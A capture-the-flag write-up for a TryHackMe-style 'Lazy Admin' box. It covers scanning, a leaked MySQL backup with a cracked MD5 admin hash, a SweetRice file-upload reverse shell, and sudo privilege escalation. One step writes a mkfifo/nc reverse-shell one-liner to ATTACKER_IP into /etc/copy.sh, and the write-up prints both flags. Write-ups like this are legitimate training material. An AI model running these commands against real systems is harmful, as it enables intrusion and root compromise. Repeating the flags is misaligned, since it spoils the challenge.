# Lazy Admin

---

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

---

## Dirsearch

```bash
dirsearch -u http://lazy.thm -e * -t 50
```

```
01:28:21  301   306B  /content  →  http://lazy.thm/content/
01:28:22  200   980B  /content/
```

Running dirsearch again on `/content/`:

```
01:29:13  200   453B  /content/_themes/
01:29:30  200     6KB /content/changelog.txt
01:29:42  200   682B  /content/images/
01:29:42  301   313B  /content/images  →  http://lazy.thm/content/images/
01:29:42  200   907B  /content/inc/
01:29:42  301   310B  /content/inc  →  http://lazy.thm/content/inc/
01:29:42  200   987B  /content/index.php/login/
01:29:44  200   533B  /content/js/
01:29:45  200     6KB /content/license.txt
```

<img width="1847" height="963" alt="Screenshot From 2025-09-05 20-33-15" src="https://github.com/user-attachments/assets/d7a49a3f-f815-413b-98f9-c861a656b037" />

---

## MySQL Backup

At `/content/inc/mysql_backup/` it looked empty, but converting to PHP showed SQL dump code:

```php
<?php return array (
  0 => 'DROP TABLE IF EXISTS `%__%_attachment`;',
  1 => 'CREATE TABLE `%__%_attachment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  ...
  14 => 'INSERT INTO `%__%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";...}'
);
?>
```

The highlighted line gave:

```
admin: manager
passwd: 42f749ade7f9e195bf475f37a44cafcb
```

Hash type: **MD5**
Using CrackStation:

```
42f749ade7f9e195bf475f37a44cafcb → Password123
```

---

## Login

Now we can log in at:

```
http://lazy.thm/content/as/
```

<img width="1847" height="963" alt="Screenshot From 2025-09-05 20-56-19" src="https://github.com/user-attachments/assets/88718087-47d5-4e94-bf7d-cb99298e4383" />

Dashboard shows:

```
Current version: 1.5.1
```

Searching exploit-db:
[https://www.exploit-db.com/exploits/40716](https://www.exploit-db.com/exploits/40716)

This version of **SweetRice CMS** is vulnerable to a file upload exploit.

---

## Exploit

I prepared a PHP reverse shell, uploaded it in the Ads section, and started a listener:

```bash
nc -lvnp 4444
```

Then visited:

```
http://lazy.thm/content/inc/ads/<filename>
```

The payload executed, and I got a reverse shell as `www-data`.

<img width="1847" height="963" alt="Screenshot From 2025-09-05 21-12-21" src="https://github.com/user-attachments/assets/d2cbbbc7-2dfa-4aa9-9894-2a5fd3d2a973" />

First flag:

```
THM{63e5bce9271952aad1113b6f1ac28a07}
```

---

## Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Looking at `/home/itguy/backup.pl`:

```perl
system("sh", "/etc/copy.sh");
```

This runs `/etc/copy.sh`. Since I could write to it, I added a reverse shell:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 1235 >/tmp/f' >/etc/copy.sh
```

Then ran:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

Caught a root shell and read the flag:

```
THM{6637f41d0177b6f37cb20d775124699f}
```

---

## Flags

> Q1: User flag
> A1: THM{63e5bce9271952aad1113b6f1ac28a07}

> Q2: Root flag
> A2: THM{6637f41d0177b6f37cb20d775124699f}
